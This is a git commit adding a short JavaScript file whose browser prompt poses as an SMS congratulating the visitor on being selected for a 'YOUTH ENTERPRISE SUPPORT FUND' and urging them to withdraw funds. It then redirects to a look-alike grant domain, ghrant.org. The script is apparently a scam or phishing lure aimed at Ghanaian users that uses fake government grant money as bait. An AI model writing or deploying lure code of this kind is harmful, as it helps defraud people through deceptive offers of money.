f2df61dff3716f4fb1a813aea325c27c35fc4c5e
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-07 11:15:58 +0100

    Create ghana-active.js

---
+++ ghana-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW FUND'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive YOUTH ENTERPRISE SUPPORT FUND, Press Ok to withdraw fund Now ','WITHDRAW FUND');
+if (password != 'WITHDRAW FUND') {
+location.href='https://ghrant.org/yes-ghana';
+}
